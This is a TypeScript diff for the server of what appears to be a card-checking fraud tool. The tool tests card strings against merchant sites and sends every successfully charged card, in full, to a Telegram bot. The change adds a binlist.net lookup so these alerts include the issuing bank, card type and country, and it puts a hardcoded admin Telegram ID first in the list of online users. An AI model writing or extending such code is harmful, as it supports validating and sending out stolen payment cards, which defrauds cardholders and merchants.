@@ -102,8 +102,9 @@ export async function registerRoutes(
   const onlineUsersCache = new Map<string, { telegramId: string; userId: number; lastSeen: Date }>();
   
   const getOnlineUsers = async () => {
-    const onlineList: Array<{ telegramId: string; userId: number; username: string | null; firstName: string | null; photoUrl: string | null }> = [];
+    const onlineList: Array<{ telegramId: string; userId: number; username: string | null; firstName: string | null; photoUrl: string | null; isAdmin: boolean }> = [];
     const seenIds = new Set<string>();
+    const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '5197976453';
     
     const clients = Array.from(wss.clients) as UserWebSocket[];
     for (const userClient of clients) {
@@ -117,11 +118,13 @@ export async function registerRoutes(
             username: user.username,
             firstName: user.firstName,
             photoUrl: user.photoUrl,
+            isAdmin: userClient.telegramId === ADMIN_ID,
           });
         }
       }
     }
-    return onlineList;
+    // Sort to put admin first
+    return onlineList.sort((a, b) => (b.isAdmin ? 1 : 0) - (a.isAdmin ? 1 : 0));
   };
 
   // === Job Management (Per-User) ===
@@ -422,13 +425,36 @@ export async function registerRoutes(
             await storage.updateSitePrice(siteId, result.price);
           }
 
-          // Send charged card to Telegram bot
-          if (isCharged && siteId) {
-            const site = await storage.getSiteById(siteId);
-            const siteName = site?.name || targetUrl;
-            sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged').catch(console.error);
-          } else if (isCharged) {
-            sendChargedCardNotification(telegramId, cardStr, targetUrl, result.message || 'Charged').catch(console.error);
+          // Send charged card to Telegram bot with BIN info
+          if (isCharged) {
+            const siteName = siteId 
+              ? (await storage.getSiteById(siteId))?.name || targetUrl 
+              : targetUrl;
+            
+            // Lookup BIN info
+            const bin = cardStr.split('|')[0]?.substring(0, 6) || '';
+            let binInfo: { brand?: string; type?: string; bank?: string; country?: string; countryCode?: string } | undefined;
+            
+            try {
+              const binResponse = await fetch(`https://lookup.binlist.net/${bin}`, {
+                headers: { 'Accept-Version': '3' },
+                signal: AbortSignal.timeout(3000)
+              });
+              if (binResponse.ok) {
+                const binData = await binResponse.json() as any;
+                binInfo = {
+                  brand: binData.scheme?.toUpperCase(),
+                  type: binData.type,
+                  bank: binData.bank?.name,
+                  country: binData.country?.name,
+                  countryCode: binData.country?.alpha2
+                };
+              }
+            } catch (e) {
+              // BIN lookup failed, continue without it
+            }
+            
+            sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged', binInfo).catch(console.error);
           }
 
           return { success: true, stopped: false, charged: isCharged };
